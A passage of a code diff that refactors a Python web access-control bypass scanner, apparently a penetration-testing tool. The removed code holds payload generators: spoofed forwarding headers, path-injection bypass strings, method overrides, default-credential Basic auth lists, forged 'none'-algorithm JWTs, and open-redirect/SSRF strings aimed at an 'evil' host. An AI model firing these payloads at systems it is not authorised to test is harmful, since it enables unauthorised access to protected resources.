+		print(("ERROR: {0}").format(msg))
+
+	def __error(self, msg, help = False):
+		self.__proceed = False
+		self.__print_error(msg)
+		if help:
+			print("Use -h for basic and --help for advanced info")
+
+	def __parse_url(self, url, key):
+		data = {
+			"url": {
+				"schemes": ["http", "https"],
+				"scheme_error": [
+					"Inaccessible URL scheme is required",
+					"Supported inaccessible URL schemes are 'http' and 'https'"
+				],
+				"domain_error": "Invalid inaccessible domain name",
+				"port_error": "Inaccessible port number is out of range"
+			},
+			"evil": {
+				"schemes": ["http", "https"],
+				"scheme_error": [
+					"Evil URL scheme is required",
+					"Supported evil URL schemes are 'http' and 'https'"
+				],
+				"domain_error": "Invalid evil domain name",
+				"port_error": "Evil port number is out of range"
+			},
+			"proxy": {
+				"schemes": ["http", "https", "socks4", "socks4h", "socks5", "socks5h"],
+				"scheme_error": [
+					"Proxy URL scheme is required",
+					"Supported proxy URL schemes are 'http[s]', 'socks4[h]', and 'socks5[h]'"
+				],
+				"domain_error": "Invalid proxy domain name",
+				"port_error": "Proxy port number is out of range"
+			}
+		}
+		tmp = urllib.parse.urlsplit(url)
+		if not tmp.scheme:
+			self.__error(data[key]["scheme_error"][0])
+		elif tmp.scheme not in data[key]["schemes"]:
+			self.__error(data[key]["scheme_error"][1])
+		elif not tmp.netloc:
+			self.__error(data[key]["domain_error"])
+		elif tmp.port and (tmp.port < 1 or tmp.port > 65535):
+			self.__error(data[key]["port_error"])
+		return url
+
+	def __parse_tests(self, string, tests, special):
+		tmp = []
+		for entry in string.split(","):
+			entry = entry.strip()
+			if not entry:
+				continue
+			elif entry == special: # all
+				tmp = [entry]
+				break
+			elif entry not in tests:
+				tmp = []
+				break
 			else:
-				args["values"] = read_file(args["values"])
-				if not args["values"]:
-					error("No additional values were found")
-		elif key == "-p" and args["path"] is None:
-			args["path"] = prepend_slash(replace_multiple_slashes(value))
-		elif key == "-e" and args["evil"] is None:
-			args["evil"] = value
-		elif key == "-i" and args["ignore"] is None:
-			args["ignore"] = value
-		elif key == "-l" and args["lengths"] is None:
-			args["lengths"] = parse_content_lengths(value.lower(), ["base", "path"])
-			if not args["lengths"]:
-				error("Content length must be either 'base', 'path', or numeric equal or greater than zero")
-		elif key == "-th" and args["threads"] is None:
-			args["threads"] = value
-			if not args["threads"].isdigit():
-				error("Number of parallel threads to run must be numeric")
+				tmp.append(entry)
+		return unique(tmp)
+
+	def __parse_content_lengths(self, string, specials):
+		tmp = []
+		for entry in string.split(","):
+			entry = entry.strip()
+			if not entry:
+				continue
+			elif entry in specials: # base, path
+				tmp.append(entry)
+			elif entry.isdigit() and int(entry) >= 0:
+				tmp.append(int(entry))
 			else:
-				args["threads"] = int(args["threads"])
-				if args["threads"] < 1:
-					error("Number of parallel threads to run must be greater than zero")
-		elif key == "-s" and args["sleep"] is None:
-			args["sleep"] = value
-			if not args["sleep"].isdigit():
-				error("Sleep must be numeric")
-			else:
-				args["sleep"] = int(args["sleep"])
-				if args["sleep"] < 1:
-					error("Sleep must be greater than zero")
-		elif key == "-a" and args["agent"] is None:
-			args["agent"] = value
-			if args["agent"].lower() in ["random", "random-all"]:
-				file = os.path.join(os.path.abspath(os.path.split(__file__)[0]), "user_agents.txt")
-				if os.path.isfile(file) and os.access(file, os.R_OK) and os.stat(file).st_size > 0:
-					array = read_file(file)
-					args["agent"] = array[random.randint(0, len(array) - 1)] if args["agent"].lower() == "random" else array
-		elif key == "-x" and args["proxy"] is None:
-			args["proxy"] = value
-		elif key == "-o" and args["out"] is None:
-			args["out"] = value
-		elif key == "-dbg" and args["debug"] is None:
-			args["debug"] = value.lower()
-			if args["debug"] != "yes":
-				error("Specify 'yes' to enable debug output")
+				tmp = []
+				break
+		return unique(tmp)
 
-def check(argc, args):
-	count = 0
-	for key in args:
-		if args[key] is not None:
-			count += 1
-	return argc - count == argc / 2
-
-# --------------------- VALIDATION END ---------------------
-
-# ------------------- TEST RECORDS BEGIN -------------------
-
-def record(raw, identifier, url, method, headers, body, ignore, agent, proxy, curl):
-	if isinstance(agent, list):
-		agent = agent[random.randint(0, len(agent) - 1)]
-	return {"raw": raw, "id": identifier, "url": url, "method": method, "headers": headers, "body": body, "ignore": ignore, "agent": agent, "proxy": proxy, "command": None, "code": 0, "length": 0, "curl": curl}
-
-def get_records(identifier, append, urls, methods, headers = None, body = None, ignore = None, agent = None, proxy = None, curl = True):
-	if not isinstance(urls, list):
-		urls = [urls]
-	records = []
-	if headers:
-		for url in urls:
-			for method in methods:
-				for header in headers:
-					identifier += 1
-					records.append(record(identifier, str(identifier) + append.upper(), url, method, header if isinstance(header, list) else [header], body, ignore, agent, proxy, curl))
-	else:
-		for url in urls:
-			for method in methods:
-				identifier += 1
-				records.append(record(identifier, str(identifier) + append.upper(), url, method, [], body, ignore, agent, proxy, curl))
-	return records
-
-def fetch(url, method, headers = None, body = None, ignore = None, agent = None, proxy = None, curl = True):
-	data = record(0, "0-FETCH-0", url, method, headers, body, ignore, agent, proxy, curl)
-	return send_curl(data) if curl else send_request(data)
-
-def fetch_accessible(urls, method, headers = None, body = None, ignore = None, agent = None, proxy = None, curl = True):
-	if not isinstance(urls, list):
-		urls = [urls]
-	records = []
-	for url in urls:
-		record = fetch(url, method, headers, body, ignore, agent, proxy, curl)
-		if record["code"] >= 200 and record["code"] < 400:
-			records.append(record)
-	return records
-
-def fetch_ips(domains_no_port):
-	if not isinstance(domains_no_port, list):
-		domains_no_port = [domains_no_port]
-	ips = []
-	for domain_no_port in domains_no_port:
+	def __parse_regex(self, regex):
 		try:
-			ips.append(socket.gethostbyname(domain_no_port))
-		except socket.error:
-			pass
-	return ips
+			re.compile(regex)
+		except re.error:
+			self.__error("Invalid RegEx")
+		return regex
 
-# -------------------- TEST RECORDS END --------------------
+	def __validate(self, key, value):
+		value = value.strip()
+		if len(value) > 0:
+			# --------------------
+			if key == "-u" and self.__args["url"] is None:
+				self.__args["url"] = self.__parse_url(value, "url")
+			# --------------------
+			elif key == "-iqsf" and self.__args["ignore_qsf"] is None:
+				self.__args["ignore_qsf"] = value.lower()
+				if self.__args["ignore_qsf"] != "yes":
+					self.__error("Specify 'yes' to ignore URL query string and fragment")
+			# --------------------
+			elif key == "-ic" and self.__args["ignore_curl"] is None:
+				self.__args["ignore_curl"] = value.lower()
+				if self.__args["ignore_curl"] != "yes":
+					self.__error("Specify 'yes' to use Python Requests instead of PycURL")
+			# --------------------
+			elif key == "-t" and self.__args["tests"] is None:
+				self.__args["tests"] = self.__parse_tests(value.lower(), ["base", "methods", "method-overrides", "scheme-overrides", "port-overrides", "headers", "paths", "encodings", "auths", "redirects", "parsers"], "all")
+				if not self.__args["tests"]:
+					self.__error("Supported tests are 'base', 'methods', '[method|scheme|port]-overrides', 'headers', 'paths', 'encodings', 'auths', 'redirects', 'parsers', or 'all'")
+			# --------------------
+			elif key == "-f" and self.__args["force"] is None:
+				self.__args["force"] = value.upper()
+			# --------------------
+			elif key == "-v" and self.__args["values"] is None:
+				self.__args["values"] = value
+				if not os.path.isfile(self.__args["values"]):
+					self.__error("File with additional values does not exists")
+				elif not os.access(self.__args["values"], os.R_OK):
+					self.__error("File with additional values does not have read permission")
+				elif not os.stat(self.__args["values"]).st_size > 0:
+					self.__error("File with additional values is empty")
+				else:
+					self.__args["values"] = read_file(self.__args["values"])
+					if not self.__args["values"]:
+						self.__error("No additional values were found")
+			# --------------------
+			elif key == "-p" and self.__args["path"] is None:
+				self.__args["path"] = prepend_slash(replace_multiple_slashes(value))
+			# --------------------
+			elif key == "-e" and self.__args["evil"] is None:
+				self.__args["evil"] = self.__parse_url(value, "evil")
+			# --------------------
+			elif key == "-i" and self.__args["ignore"] is None:
+				self.__args["ignore"] = self.__parse_regex(value)
+			# --------------------
+			elif key == "-l" and self.__args["lengths"] is None:
+				self.__args["lengths"] = self.__parse_content_lengths(value.lower(), ["base", "path"])
+				if not self.__args["lengths"]:
+					self.__error("Content length must be either 'base', 'path', or numeric equal or greater than zero")
+			# --------------------
+			elif key == "-th" and self.__args["threads"] is None:
+				self.__args["threads"] = value
+				if not self.__args["threads"].isdigit():
+					self.__error("Number of parallel threads to run must be numeric")
+				else:
+					self.__args["threads"] = int(self.__args["threads"])
+					if self.__args["threads"] < 1:
+						self.__error("Number of parallel threads to run must be greater than zero")
+			# --------------------
+			elif key == "-s" and self.__args["sleep"] is None:
+				self.__args["sleep"] = value
+				if not self.__args["sleep"].isdigit():
+					self.__error("Sleep must be numeric")
+				else:
+					self.__args["sleep"] = int(self.__args["sleep"]) / 1000
+					if self.__args["sleep"] <= 0:
+						self.__error("Sleep must be greater than zero")
+			# --------------------
+			elif key == "-a" and self.__args["agent"] is None:
+				self.__args["agent"] = value
+			# --------------------
+			elif key == "-x" and self.__args["proxy"] is None:
+				self.__args["proxy"] = self.__parse_url(value, "proxy")
+			# --------------------
+			elif key == "-o" and self.__args["out"] is None:
+				self.__args["out"] = os.path.abspath(value)
+			# --------------------
+			elif key == "-dbg" and self.__args["debug"] is None:
+				self.__args["debug"] = value.lower()
+				if self.__args["debug"] != "yes":
+					self.__error("Specify 'yes' to enable debug output")
+			# --------------------
 
-# -------------------- STRUCTURES BEGIN --------------------
+	def __check(self, argc):
+		count = 0
+		for key in self.__args:
+			if self.__args[key] is not None:
+				count += 1
+		return argc - count == argc / 2
 
-def get_base_urls(scheme, domain_no_port, port, path):
-	return [
-		("http://{0}:{1}{2}").format(domain_no_port, port if scheme == "http" else 80, path),
-		("https://{0}:{1}{2}").format(domain_no_port, port if scheme == "https" else 443, path)
-	]
+	def run(self):
+		# --------------------
+		argc = len(sys.argv) - 1
+		# --------------------
+		if argc == 0:
+			self.__advanced()
+		# --------------------
+		elif argc == 1:
+			if sys.argv[1] == "-h":
+				self.__basic()
+			elif sys.argv[1] == "--help":
+				self.__advanced()
+			else:
+				self.__error("Incorrect usage", True)
+		# --------------------
+		elif argc % 2 == 0 and argc <= len(self.__args) * 2:
+			for i in range(1, argc, 2):
+				self.__validate(sys.argv[i], sys.argv[i + 1])
+			if None in [self.__args["url"], self.__args["tests"]] or not self.__check(argc):
+				self.__error("Missing a mandatory option (-u, -t) and/or optional (-iqsf, -ic, -f, -v, -p, -e, -i, -l, -th, -s, -a, -x, -o, -dbg)", True)
+		# --------------------
+		else:
+			self.__error("Incorrect usage", True)
+		# --------------------
+		if self.__proceed:
+			if not self.__args["values"]:
+				self.__args["values"] = []
+			if not self.__args["path"]:
+				self.__args["path"] = ["/robots.txt", "/index.html", "sitemap.xml"]
+			if not self.__args["evil"]:
+				self.__args["evil"] = "https://github.com"
+			if not self.__args["lengths"]:
+				self.__args["lengths"] = []
+			if not self.__args["threads"]:
+				self.__args["threads"] = 5
+			if not self.__args["agent"]:
+				self.__args["agent"] = default_user_agent
+			elif self.__args["agent"].lower() == "random-all":
+				self.__args["agent"] = get_user_agents()
+			elif self.__args["agent"].lower() == "random":
+				self.__args["agent"] = get_random_user_agent()
+		# --------------------
+		return self.__proceed
+		# --------------------
 
-def get_methods():
-	return unique([
-		"ACL",
-		"ARBITRARY",
-		"BASELINE-CONTROL",
-		"BIND",
-		"CHECKIN",
-		"CHECKOUT",
-		"CONNECT",
-		"COPY",
-		# "DELETE", # NOTE: This HTTP method is dangerous!
-		"GET",
-		"HEAD",
-		"INDEX",
-		"LABEL",
-		"LINK",
-		"LOCK",
-		"MERGE",
-		"MKACTIVITY",
-		"MKCALENDAR",
-		"MKCOL",
-		"MKREDIRECTREF",
-		"MKWORKSPACE",
-		"MOVE",
-		"OPTIONS",
-		"ORDERPATCH",
-		"PATCH",
-		"POST",
-		"PRI",
-		"PROPFIND",
-		"PROPPATCH",
-		"PUT",
-		"REBIND",
-		"REPORT",
-		"SEARCH",
-		"SHOWMETHOD",
-		"SPACEJUMP",
-		"TEXTSEARCH",
-		"TRACE",
-		"TRACK",
-		"UNBIND",
-		"UNCHECKOUT",
-		"UNLINK",
-		"UNLOCK",
-		"UPDATE",
-		"UPDATEREDIRECTREF",
-		"VERSION-CONTROL"
-	])
+	def get_arg(self, key):
+		return self.__args[key]
 
-def get_method_override_headers(methods):
-	tmp = []
-	headers = [
-		"X-HTTP-Method",
-		"X-HTTP-Method-Override",
-		"X-Method-Override"
-	]
-	for header in headers:
-		for method in methods:
-			tmp.append(("{0}: {1}").format(header, method))
-	return unique(tmp)
-
-def get_method_override_urls(url, methods):
-	tmp = []
-	parameters = [
-		"x-http-method-override",
-		"x-method-override"
-	]
-	separator = "&" if "?" in url else "?"
-	for parameter in parameters:
-		for method in methods:
-			tmp.append(("{0}{1}{2}={3}").format(url, separator, parameter, method))
-	return unique(tmp)
-
-def get_scheme_override_headers(schemes):
-	tmp = []
-	headers = [
-		"X-Forwarded-Proto",
-		"X-Forwarded-Protocol",
-		"X-Forwarded-Scheme",
-		"X-URL-Scheme",
-		"X-URLSCHEME"
-	]
-	ssl = [
-		"Front-End-HTTPS",
-		"X-Forwarded-SSL"
-	]
-	for scheme in schemes:
-		for header in headers:
-			tmp.append(("{0}: {1}").format(header, scheme))
-		status = "on" if scheme.lower() == "https" else "off"
-		for header in ssl:
-			tmp.append(("{0}: {1}").format(header, status))
-	return unique(tmp)
-
-def get_port_override_headers(ports):
-	tmp = []
-	headers = [
-		"X-Forwarded-Port"
-	]
-	for header in headers:
-		for port in ports:
-			tmp.append(("{0}: {1}").format(header, port))
-	return unique(tmp)
-
-# TO DO: Add IPv6 localhost.
-def get_localhost_urls(scheme = None, port = None):
-	return extend_domains(["localhost", "127.0.0.1", unicode_encode("127.0.0.1"), "127.000.000.001"], scheme, port)
-
-def get_random_urls(scheme = None, port = None):
-	return extend_domains(["192.168.1.5"], scheme, port)
-
-def get_values(evil, scheme = None, port = None, values = None):
-	tmp = get_localhost_urls(scheme, port) + get_random_urls(scheme, port) + extend_domains(evil, scheme)
-	if values:
-		tmp.extend(values)
-	return unique(tmp)
-
-def get_headers(values):
-	tmp = []
-	headers = [
-		"Base-URL",
-		"CF-Connecting-IP",
-		"Client-IP",
-		"Cluster-Client-IP",
-		"Connection",
-		"Contact",
-		"Destination",
-		"Forwarded",
-		"Forwarded-For",
-		"Forwarded-For-IP",
-		"From",
-		"Host",
-		"Origin",
-		"Profile",
-		"Proxy",
-		"Redirect",
-		"Referer",
-		"Request-URI",
-		"Stuff",
-		"True-Client-IP",
-		"URI",
-		"URL",
-		"X-Client-IP",
-		"X-Forward",
-		"X-Forwarded",
-		"X-Forwarded-By",
-		"X-Forwarded-For",
-		"X-Forwarded-For-Original",
-		"X-Forwarded-Host",
-		"X-Forwarded-Server",
-		"X-Forward-For",
-		"X-Host",
-		"X-Host-Override",
-		"X-HTTP-DestinationURL",
-		"X-HTTP-Host-Override",
-		"X-Originally-Forwarded-For",
-		"X-Original-Remote-Addr",
-		"X-Original-URL",
-		"X-Originating-IP",
-		"X-Override-URL",
-		"X-Proxy-URL",
-		"X-ProxyUser-IP",
-		"X-Real-IP",
-		"X-Referer",
-		"X-Remote-Addr",
-		"X-Remote-IP",
-		"X-Rewrite-URL",
-		"X-Server-IP",
-		"X-Wap-Profile"
-	]
-	for header in headers:
-		for value in values:
-			tmp.append(("{0}: {1}").format(header, value))
-	headers = [
-		"X-Custom-IP-Authorization"
-	]
-	injections = ["", ";", ".;", "..;"]
-	for header in headers:
-		for value in values:
-			for injection in injections:
-				tmp.append(("{0}: {1}{2}").format(header, value, injection))
-	return unique(tmp)
-
-def get_double_host_header(initials, overrides):
-	tmp = []
-	for initial in initials:
-		for override in overrides:
-			tmp.append([
-				("Host: {0}").format(initial),
-				("Host: {0}").format(override)
-			])
-	return tmp
-
-def get_bypass_urls(scheme_domain, initial_path = None):
-	tmp = []
-	const = "/"
-	# --------------------
-	path = initial_path.strip(const) if initial_path else ""
-	# --------------------
-	# NOTE: Inject at the beginning, end, and both beginning and end of URL path. All combinations.
-	injections = []
-	for i in ["", "%09", "%20", "%23", "%2e", "*", ".", "..", ";", ".;", "..;", ";foo=bar;"]:
-		injections.extend([const + i + const, i + const, const + i, i])
-	for i in injections:
-		tmp.extend([path + i, i + path])
-		if path:
-			for j in injections:
-				tmp.extend([i + path + j])
-	# --------------------
-	# NOTE: Inject at the end of URL path.
-	paths = [path, path + const]
-	injections = []
-	for i in ["#", "*", ".", "?", "~"]:
-		injections.extend([i, i + i, i + "random"])
-	for p in paths:
-		for i in injections:
-			tmp.extend([p + i])
-	# --------------------
-	# NOTE: Inject at the end of URL path, but only if URL path does not end with '/'.
-	if path and not initial_path.endswith(const):
-		injections = ["asp", "aspx", "esp", "html", "jhtml", "json", "jsp", "jspa", "jspx", "php", "sht", "shtml", "xhtml"]
-		for i in injections:
-			tmp.extend([path + "." + i])
-	# --------------------
-	return unique([scheme_domain + prepend_slash(bypass) for bypass in tmp])
-
-# NOTE: Only domain name and last directory/file in URL path are transformed and encoded.
-def get_encoded_urls(scheme, domain_no_port, port, path = None):
-	tmp = []
-	scheme += "://"
-	domains = get_encoded_domains(domain_no_port, port)
-	if path:
-		for domain in domains:
-			tmp.append(scheme + domain + path)
-		paths = get_encoded_paths(path)
-		for p in paths:
-			tmp.append(scheme + ("{0}:{1}").format(domain_no_port, port) + p)
-		for domain in domains:
-			for p in paths:
-				tmp.append(scheme + domain + p)
-	else:
-		for domain in domains:
-			tmp.append(scheme + domain)
-	return unique(tmp)
-
-def get_basic_auth_headers():
-	tmp = []
-	headers = [
-		"Authorization"
-	]
-	values = ["", "null", "None", "nil"]
-	usernames = ["admin", "cisco", "gateway", "guest", "jigsaw", "root", "router", "switch", "tomcat", "wampp", "xampp"]
-	passwords = ["admin", "cisco", "default", "gateway", "guest", "jigsaw", "password", "root", "router", "secret", "switch", "tomcat", "toor", "wampp", "xampp"]
-	for username in usernames:
-		for password in passwords:
-			values.append(base64.b64encode((username + ":" + password).encode("UTF-8")).decode("UTF-8"))
-	for header in headers:
-		for value in values:
-			tmp.append(("{0}: Basic {1}").format(header, value))
-	return unique(tmp)
-
-def get_bearer_auth_headers():
-	tmp = []
-	headers = [
-		"Authorization"
-	]
-	values = ["", "null", "None", "nil", "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJhZG1pbiI6dHJ1ZX0.", "eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJhZG1pbiI6dHJ1ZX0.", "eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJhZG1pbiI6dHJ1ZX0.", "eyJhbGciOiJuT25FIiwidHlwIjoiSldUIn0.eyJhZG1pbiI6dHJ1ZX0.", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6dHJ1ZX0.r-hgxha_LeQiMlH5NKCmjNQtxPjWA91xL10_flfoTTs"]
-	for header in headers:
-		for value in values:
-			tmp.append(("{0}: Bearer {1}").format(header, value))
-	return unique(tmp)
-
-def get_redirect_urls(scheme, domain_no_port, evil, path = None):
-	tmp = []
-	overrides = extend_domains(evil, scheme)
-	tmp.extend(overrides)
-	const = "/"
-	injections = [const, const + "."]
-	for override in overrides:
-		for injection in injections:
-			tmp.append(override + injection + domain_no_port)
-			if path:
-				tmp.append(override + injection + domain_no_port + path)
-		override = strip_url_scheme(override)
-		tmp.extend([
-			("{0}.{1}").format(domain_no_port, override),
-			("{0}://{1}.{2}").format(scheme, domain_no_port, override)
-		])
-	return unique(tmp)
-
-def get_broken_urls(scheme, domain_no_port, port, evil):
-	tmp = []
-	injections = ["@", " @", "#@"]
-	for initial in extend_domains(domain_no_port, scheme, port):
-		for override in extend_domains(evil, scheme):
-			override = strip_url_scheme(override)
-			for injection in injections:
-				tmp.append(initial + injection + override)
-	return unique(tmp)
-
-# --------------------- STRUCTURES END ---------------------
-
-# ----------------------- TASK BEGIN -----------------------
-
-# TO DO: Do not ignore URL parameters and fragments.
-def parse_url(url):
-	scheme = url.scheme.lower()
-	domain = url.netloc.lower()
-	port = url.port
-	if not port:
-		port = 443 if scheme == "https" else 80
-		domain = ("{0}:{1}").format(domain, port)
-	path = replace_multiple_slashes(url.path)
-	tmp = {
-		"scheme": scheme,
-		"port": port,
-		"domain_no_port": domain.split(":", 1)[0],
-		"domain": domain,
-		"scheme_domain": scheme + "://" + domain,
-		"path": path,
-		"full": scheme + "://" + domain + path,
-		"directories": append_paths(scheme + "://" + domain, get_directories(path)),
-		"paths": extend_path(path)
-	}
-	tmp["urls"] = [tmp["full"], tmp["scheme_domain"], tmp["domain"], tmp["domain_no_port"]]
-	tmp["all"] = tmp["urls"] + tmp["paths"]
-	for key in tmp:
-		if isinstance(tmp[key], list):
-			tmp[key] = unique(tmp[key])
-	return tmp
-
-def get_collection(url, tests, accessible, evil, force = None, values = None, ignore = None, agent = None, proxy = None):
-	collection = []
-	identifier = 0
-	if contains(tests, ["methods", "all"]):
-		local = {
-			"urls": {
-				"base": get_base_urls(url["scheme"], url["domain_no_port"], url["port"], url["path"])
-			},
-			"methods": [force] if force else get_methods(),
-			"headers": {
-				"content-lengths": ["Content-Length: 0"]
-			},
-			"xst": {
-				"methods": ["TRACE", "TRACK"],
-				"headers": ["XSTH: XSTV"]
-			},
-			"file-upload": {
-				"urls": append_paths(url["directories"], ["/pentest.txt"]),
-				"methods": ["PUT"],
-				"headers": ["Content-Type: ", "Content-Type: text/plain"],
-				"body": "pentest"
-			}
-		}
-		# NOTE: Test HTTP methods with both HTTP and HTTPS requests.
-		records = get_records(identifier, "-METHODS-1", local["urls"]["base"], local["methods"], None, None, ignore, agent, proxy)
-		collection.extend(records)
-		identifier = len(collection)
-		# NOTE: Test HTTP methods with 'Content-Length: 0' header.
-		records = get_records(identifier, "-METHODS-2", url["full"], local["methods"], local["headers"]["content-lengths"], None, ignore, agent, proxy)
-		collection.extend(records)
-		identifier = len(collection)
-		# NOTE: Test cross-site tracing (XST) with HTTP TRACE and TRACK methods.
-		# NOTE: To confirm the vulnerability, check if 'XSTH: XSTV' header is returned in HTTP response.
-		records = get_records(identifier, "-METHODS-3", url["full"], local["xst"]["methods"], local["xst"]["headers"], None, ignore, agent, proxy)
-		collection.extend(records)
-		identifier = len(collection)
-		# NOTE: Test [text] file upload with HTTP PUT method.
-		records = get_records(identifier, "-METHODS-4", local["file-upload"]["urls"], local["file-upload"]["methods"], local["file-upload"]["headers"], local["file-upload"]["body"], ignore, agent, proxy)
-		collection.extend(records)
-		identifier = len(collection)
-	if contains(tests, ["method-overrides", "all"]):
-		local = {
-			"urls": {
-				"method-overrides": get_method_override_urls(url["full"], [force] if force else get_methods())
-			},
-			"methods": get_methods(),
-			"headers": {
-				"method-overrides": get_method_override_headers([force] if force else get_methods())
-			}
-		}
-		# NOTE: Test HTTP method overrides with HTTP headers.
-		records = get_records(identifier, "-METHOD-OVERRIDES-1", url["full"], local["methods"], local["headers"]["method-overrides"], None, ignore, agent, proxy)
-		collection.extend(records)
-		identifier = len(collection)
-		# NOTE: Test HTTP method overrides with URL parameters.
-		records = get_records(identifier, "-METHOD-OVERRIDES-2", local["urls"]["method-overrides"], local["methods"], None, None, ignore, agent, proxy)
-		collection.extend(records)
-		identifier = len(collection)
-	if contains(tests, ["scheme-overrides", "all"]):
-		local = {
-			"urls": {
-				"base": get_base_urls(url["scheme"], url["domain_no_port"], url["port"], url["path"])
-			},
-			"methods": [force] if force else ["GET"],
-			"headers": {
-				"scheme-overrides": get_scheme_override_headers(["http", "https"])
-			}
-		}
-		# NOTE: Test URL scheme overrides.
-		records = get_records(identifier, "-SCHEME-OVERRIDES-1", local["urls"]["base"], local["methods"], local["headers"]["scheme-overrides"], None, ignore, agent, proxy)
-		collection.extend(records)
-		identifier = len(collection)
-	if contains(tests, ["port-overrides", "all"]):
-		local = {
-			"methods": [force] if force else ["GET"],
-			"headers": {
-				"port-overrides": get_port_override_headers([url["port"], 80, 443, 4443, 8008, 8080, 8403, 8443, 9008, 9080, 9403, 9443])
-			}
-		}
-		# NOTE: Test port overrides.
-		records = get_records(identifier, "-PORT-OVERRIDES-1", url["full"], local["methods"], local["headers"]["port-overrides"], None, ignore, agent, proxy)
-		collection.extend(records)
-		identifier = len(collection)
-	if contains(tests, ["headers", "all"]):
-		local = {
-			"methods": [force] if force else ["GET"],
-			"headers": {
-				"accepts": ["Accept: application/json,text/javascript,*/*;q=0.01"],
-				"all": get_headers(get_values(evil, url["scheme"], url["port"], url["all"] + values if values else url["all"])),
-				"paths": get_headers([url["full"]] + url["paths"]),
-				"hosts": get_double_host_header(url["urls"], extend_domains(evil, url["scheme"]))
-			}
-		}
-		# NOTE: Test information disclosure with 'Accept' header.
-		records = get_records(identifier, "-HEADERS-1", url["full"], local["methods"], local["headers"]["accepts"], None, ignore, agent, proxy)
-		collection.extend(records)
-		identifier = len(collection)
-		# NOTE: Test HTTP headers with full URL and all values (including user-supplied ones).
-		records = get_records(identifier, "-HEADERS-2", url["full"], local["methods"], local["headers"]["all"], None, ignore, agent, proxy)
-		collection.extend(records)
-		identifier = len(collection)
-		# NOTE: Test HTTP headers with base URL and only path values.
-		records = get_records(identifier, "-HEADERS-3", url["scheme_domain"], local["methods"], local["headers"]["paths"], None, ignore, agent, proxy)
-		collection.extend(records)
-		identifier = len(collection)
-		# NOTE: Test HTTP headers with accessible URL and only path values.
-		records = get_records(identifier, "-HEADERS-4", accessible, local["methods"], local["headers"]["paths"], None, ignore, agent, proxy)
-		collection.extend(records)
-		identifier = len(collection)
-		# NOTE: Test URL override with double 'Host' header.
-		# records = get_records(identifier, "-HEADERS-5", url["full"], local["methods"], local["headers"]["hosts"], None, ignore, agent, proxy, False)
-		# collection.extend(records)
-		# identifier = len(collection)
-	if contains(tests, ["paths", "all"]):
-		local = {
-			"urls": {
-				"bypass": get_bypass_urls(url["scheme_domain"], url["path"])
-			},
-			"methods": [force] if force else ["GET"],
-		}
-		# NOTE: Test URL path bypasses.
-		records = get_records(identifier, "-PATHS-1", local["urls"]["bypass"], local["methods"], None, None, ignore, agent, proxy)
-		collection.extend(records)
-		identifier = len(collection)
-	if contains(tests, ["encodings", "all"]):
-		local = {
-			"urls": {
-				"encoded": get_encoded_urls(url["scheme"], url["domain_no_port"], url["port"], url["path"])
-			},
-			"methods": [force] if force else ["GET"],
-		}
-		# NOTE: Test URL transformations and encodings. Only domain name and last directory/file in URL path are transformed and encoded.
-		records = get_records(identifier, "-ENCODINGS-1", local["urls"]["encoded"], local["methods"], None, None, ignore, agent, proxy)
-		collection.extend(records)
-		identifier = len(collection)
-	if contains(tests, ["auths", "all"]):
-		local = {
-			"methods": [force] if force else ["GET"],
-			"headers": {
-				"auths": get_basic_auth_headers() + get_bearer_auth_headers()
-			}
-		}
-		# NOTE: Test basic and bearer authentication.
-		records = get_records(identifier, "-AUTHS-1", url["full"], local["methods"], local["headers"]["auths"], None, ignore, agent, proxy)
-		collection.extend(records)
-		identifier = len(collection)
-	if contains(tests, ["redirects", "all"]):
-		local = {
-			"methods": [force] if force else ["GET"],
-			"headers": {
-				"redirects": get_headers(get_redirect_urls(url["scheme"], url["domain_no_port"], evil, url["path"]))
-			}
-		}
-		# NOTE: Test open redirects and server-side request forgery (SSRF).
-		records = get_records(identifier, "-REDIRECTS-1", url["full"], local["methods"], local["headers"]["redirects"], None, ignore, agent, proxy)
-		collection.extend(records)
-		identifier = len(collection)
-	if contains(tests, ["parsers", "all"]):
-		local = {
-			"methods": [force] if force else ["GET"],
-			"headers": {
-				"parsers": get_headers(get_broken_urls(url["scheme"], url["domain_no_port"], url["port"], evil))
-			}
-		}
-		# NOTE: Test URL parsers.
-		records = get_records(identifier, "-PARSERS-1", url["full"], local["methods"], local["headers"]["parsers"], None, ignore, agent, proxy)
-		collection.extend(records)
-		identifier = len(collection)
-	return collection
-
-# TO DO: Escape single quotes.
-def get_commands(collection):
-	for record in collection:
-		curl = ["curl", "--connect-timeout 90", "-m 180", "-iskL", "--max-redirs 10", "--path-as-is"]
-		if record["body"]:
-			curl.append(("-d '{0}'").format(record["body"]))
-		if record["headers"]:
-			for header in record["headers"]:
-				curl.append(("-H '{0}'").format(header))
-		if record["agent"]:
-			curl.append(("-H 'User-Agent: {0}'").format(record["agent"]))
-		if record["proxy"]:
-			curl.append(("-x '{0}'").format(record["proxy"]))
-		curl.append(("-X '{0}'").format(record["method"]))
-		curl.append(("'{0}'").format(record["url"]))
-		record["command"] = (" ").join(curl)
-	return collection
-
-def filter(collection):
-	tmp = []
-	commands = []
-	for record in collection:
-		if record["command"] not in commands:
-			commands.append(record["command"])
-			tmp.append(record)
-	return tmp
-
-def get_timestamp(text):
-	return print(("{0} - {1}").format(datetime.datetime.now().strftime("%H:%M:%S"), text))
-
-def progress(count, total):
-	print(("Progress: {0}/{1} | {2:.2f}%").format(count, total, (count / total) * 100), end = "\n" if count == total else "\r")
-
-def send_request(record, sleep = None, debug = None):
-	if sleep:
-		time.sleep(sleep)
-	encoding = "UTF-8"
-	if record["body"]:
-		record["body"].encode(encoding)
-	headers = {}
-	if record["headers"]:
-		for header in record["headers"]:
-			array = header.split(": ", 1)
-			# headers[uniquestr(array[0])] = array[1].encode(encoding) # NOTE: Bug to exploit double headers is fixed and no longer works.
-			headers[array[0]] = array[1].encode(encoding)
-	if record["agent"]:
-		headers["User-Agent"] = record["agent"].encode(encoding)
-	proxies = {}
-	if record["proxy"]:
-		proxies["http"] = proxies["https"] = record["proxy"]
-	response = None
-	session = requests.Session()
-	session.max_redirects = 10
-	try:
-		request = requests.Request(record["method"], record["url"], headers = headers, data = record["body"])
-		prepared = session.prepare_request(request)
-		prepared.url = record["url"]
-		response = session.send(prepared, proxies = proxies, timeout = (90, 180), verify = False, allow_redirects = True)
-		record["code"] = response.status_code
-		record["length"] = len(response.content)
